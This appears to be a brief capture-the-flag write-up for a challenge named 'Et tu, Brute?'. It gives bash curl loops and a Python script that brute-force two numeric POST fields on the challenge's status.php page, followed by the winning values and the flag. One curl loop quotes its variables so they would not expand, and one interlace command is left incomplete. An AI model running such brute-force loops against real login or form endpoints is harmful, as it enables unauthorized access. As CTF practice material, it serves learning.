# Et tu, Brute?

## Objetivo

## Solucion

      
```bash
for i in {1..100}; do for j in {1..100}; do echo $i:$j; done; done


for i in {1..100}; do for j in {1..100}; do curl -X POST -d 'number=$i&number2=$j' 'https://mhsctf-ettubrute.0xmmalik.repl.co/status.php'; done; done

interlace -t https://mhsctf-ettubrute.0xmmalik.repl.co/status.php -threads 40 -c 



curl -X POST -d 'number=1&number2=1' https://mhsctf-ettubrute.0xmmalik.repl.co/status.php


```

```python
import requests

url = 'https://mhsctf-ettubrute.0xmmalik.repl.co/status.php'
s = requests.Session()

for i in range(1,101):
    for j in range(1,101):
        data = {'number':i, 'number2':j}
        r = s.post(url, data=data)
        if(j==1): print(data)
        if 'Sorry' not in r.text:
            print(data)
            print(r.text)
```

```bash
{'number': 77, 'number2': 97}
Wow! You must really be my friend if you know my favorite and second favorite numbers! Here's a flag for you: flag{pur3_s7r3ngth}
{'number': 78, 'number2': 1}
```

## Flag
Wow! You must really be my friend if you know my favorite and second favorite numbers! Here's a flag for you: flag{pur3_s7r3ngth}
## Referencias